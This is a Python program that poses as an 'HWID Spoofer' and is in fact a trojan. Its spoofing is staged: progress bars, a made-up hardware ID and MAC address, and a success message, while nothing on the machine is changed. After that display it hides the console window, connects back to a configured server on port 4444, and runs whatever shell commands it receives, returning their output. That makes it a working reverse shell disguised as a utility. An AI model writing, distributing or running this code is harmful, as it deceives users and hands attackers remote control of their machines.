import socket
import subprocess
import os
import sys
import ctypes  # Windows
import time
import random
import string
import uuid
import re
from colorama import Fore, Style, init
from tqdm import tqdm
from pyfiglet import Figlet

TARGET_IP = '127.0.0.1' # Server IP
TARGET_PORT = 4444

init(autoreset=True)

def generate_random_mac_address():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def get_hwid():
    return str(uuid.getnode())

def get_mac_address():
    if os.name == 'nt':
        output = subprocess.check_output("getmac", shell=True).decode()
        mac_address = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', output)
        return mac_address.group(0) if mac_address else "Unknown"
    else:
        return "Unknown"

def get_system_info():
    user = os.getlogin()
    pc_name = socket.gethostname()
    os_version = sys.platform
    ip_address = socket.gethostbyname(pc_name)
    return user, pc_name, os_version, ip_address

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_final_info(user, pc_name, os_version, ip_address, new_hwid, new_mac_address):
    clear_console()
    f = Figlet(font='slant')
    print(Fore.CYAN + f.renderText(' HWID Spoofer '))
    print(Fore.CYAN + " Your devices were successfully spoofed!\n")
    print(Fore.CYAN + f" User: {user}")
    print(Fore.CYAN + f" PC Name: {pc_name}")
    print(Fore.CYAN + f" OS Version: {os_version}")
    print(Fore.CYAN + f" IP Address: {ip_address}")
    print(Fore.CYAN + f" Hardware: {new_hwid}")
    print(Fore.CYAN + f" Mac Address: {new_mac_address}")
    input(Fore.CYAN + "\n\n\t Press Enter to continue...")

def simulate_hwid_spoofing():
    clear_console()
    f = Figlet(font='slant')
    print(Fore.CYAN + f.renderText(' HWID Spoofer '))

    for _ in tqdm(range(50), desc="Starting...", colour='blue', ncols=80, bar_format="{desc}: {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.1)

    user, pc_name, os_version, ip_address = get_system_info()
    print(Fore.CYAN + f" User: {user}")
    print(Fore.CYAN + f" PC Name: {pc_name}")
    print(Fore.CYAN + f" OS Version: {os_version}")
    print(Fore.CYAN + f" IP Address: {ip_address}")

    for _ in tqdm(range(50), desc="Scanning Devices", colour='blue', ncols=80, bar_format="{desc}: {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.1)

    hwid = get_hwid()
    mac_address = get_mac_address()
    print(Fore.CYAN + f" HWID: {hwid}")
    print(Fore.CYAN + f" MAC Address: {mac_address}")

    for _ in tqdm(range(100), desc="Spoofing...", colour='blue', ncols=80, bar_format="{desc}: {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.1)

    new_hwid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    new_mac_address = generate_random_mac_address()

    display_final_info(user, pc_name, os_version, ip_address, new_hwid, new_mac_address)

def execute_command(command, s):
    try:
        if command.lower() == 'quit':
            s.close()
            sys.exit(0)
        if command[:2].lower() == 'cd':
            change_directory(command[3:], s)
        else:
            run_command(command, s)
    except Exception as e:
        s.send(str.encode(f"Error executing command: {e}\n"))

def change_directory(path, s):
    try:
        os.chdir(path)
        s.send(str.encode(os.getcwd() + '> '))
    except Exception as e:
        s.send(str.encode(str(e) + '\n'))

def run_command(command, s):
    try:
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode('utf-8', errors='ignore')
        s.send(str.encode(output_str + os.getcwd() + '> '))
    except Exception as e:
        s.send(str.encode(f"Error executing command: {e}\n"))

def handle_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(b'[+] Connection established.\n')
        s.settimeout(5)
    except socket.error as e:
        sys.exit(1)

    hide_window()

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode('utf-8')
            execute_command(command, s)
        except socket.timeout:
            continue
        except Exception as e:
            s.send(str.encode(f"Error: {e}\n"))
            break

    s.close()

def hide_window():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    else:
        sys.stdout.write("\x1b[8;1;1t")
        sys.stdout.flush()

if __name__ == "__main__":
    simulate_hwid_spoofing()
    hide_window()
    handle_connection()
